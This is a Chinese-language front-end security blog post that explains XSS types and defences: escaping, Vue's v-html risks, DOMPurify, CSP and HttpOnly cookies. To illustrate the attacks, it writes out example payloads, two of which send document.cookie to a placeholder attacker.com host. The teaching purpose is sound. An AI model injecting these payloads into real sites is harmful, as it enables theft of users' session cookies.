---
title: "前端安全：XSS 防御手册"
date: 2018-03-08 10:50:19
tags:
  - 安全
readingTime: 2
description: "XSS（Cross-Site Scripting）是最常见的前端安全漏洞之一。这篇文章从攻击原理到防御方案，系统整理一遍。"
wordCount: 461
---

XSS（Cross-Site Scripting）是最常见的前端安全漏洞之一。这篇文章从攻击原理到防御方案，系统整理一遍。

## XSS 的三种类型

### 存储型 XSS

攻击者把恶意脚本存到数据库，其他用户访问时执行：

```
攻击者提交评论：<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

服务端保存到数据库
↓
其他用户加载评论列表
↓
浏览器执行 script，把 cookie 发送到攻击者服务器
```

危害最大，因为每个访问该页面的用户都受影响。

### 反射型 XSS

恶意脚本藏在 URL 里，诱导用户点击：

```
正常 URL：https://example.com/search?q=前端
恶意 URL：https://example.com/search?q=<script>alert(document.cookie)</script>

服务端把 q 参数直接拼进 HTML：
<p>搜索结果：<script>alert(document.cookie)</script></p>
```

### DOM 型 XSS

攻击发生在客户端，不经过服务器：

```javascript
// 危险代码：直接把 URL 参数插入 DOM
const query = location.search.substring(1);
document.getElementById("result").innerHTML = "搜索：" + query;

// 攻击 URL：?<img src=x onerror=alert(document.cookie)>
```

## 防御方案

### 1. 输出编码（最基础）

永远不要把用户输入直接插入 HTML。使用转义函数：

```javascript
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// 使用
element.textContent = userInput; // ✅ 安全，浏览器自动转义
element.innerHTML = escapeHTML(userInput); // ✅ 手动转义

element.innerHTML = userInput; // ❌ 危险！
```

Vue 默认使用 `&#123;&#123; &#125;&#125;` 渲染文本内容，自动转义，是安全的：

```vue
{% raw %}
<template>
  <!-- ✅ 安全：自动转义 -->
  <p>{{ userComment }}</p>

  <!-- ❌ 危险：v-html 不转义 -->
  <p v-html="userComment"></p>
</template>
{% endraw %}
```

### 2. v-html 的安全使用

如果确实需要渲染 HTML（比如富文本），必须先消毒（sanitize）：

```javascript
import DOMPurify from "dompurify";

// 配置允许的标签和属性
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});
```

```vue
<p v-html="sanitizedContent"></p>
```

### 3. CSP（内容安全策略）

HTTP 响应头里告诉浏览器只允许加载指定来源的资源：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-xxx';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com
```

即使 XSS 代码被注入，由于 CSP 限制，恶意脚本也无法加载和执行。

Nginx 配置：

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'";
```

### 4. HttpOnly Cookie

把 session token 设置为 HttpOnly，JS 无法读取：

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

即使发生 XSS，攻击者也无法通过 `document.cookie` 窃取 token。

### 5. 输入验证

前端验证只是辅助，真正的验证必须在服务端做。但前端也应该：

```javascript
// 富文本编辑器：限制允许的 HTML 标签
// URL 参数：验证格式，拒绝 javascript: 协议
function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// ❌ javascript:alert(1)  → 被拒绝
// ✅ https://example.com   → 允许
```

## 实际踩坑案例

**案例：搜索框反射 XSS**

```vue
<!-- ❌ 把 URL 参数直接显示，没有转义 -->
<template>
  <p v-html="'搜索：' + $route.query.keyword"></p>
</template>
```

攻击 URL：`?keyword=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`

修复：

```vue
{% raw %}
<!-- ✅ 用文本插值，自动转义 -->
<template>
  <p>搜索：{{ $route.query.keyword }}</p>
</template>
{% endraw %}
```

## 防御清单

- [ ] 不使用 `innerHTML`，优先用 `textContent`
- [ ] Vue 中谨慎使用 `v-html`，必须先 sanitize
- [ ] 服务端对所有输出做 HTML 转义
- [ ] 配置 CSP 响应头
- [ ] Session cookie 设置 HttpOnly + Secure
- [ ] URL 参数使用前验证协议类型

## 小结

XSS 防御的核心原则：**永远不信任用户输入**，输出时永远转义。CSP 和 HttpOnly 是额外的防御层，出问题时限制损害。
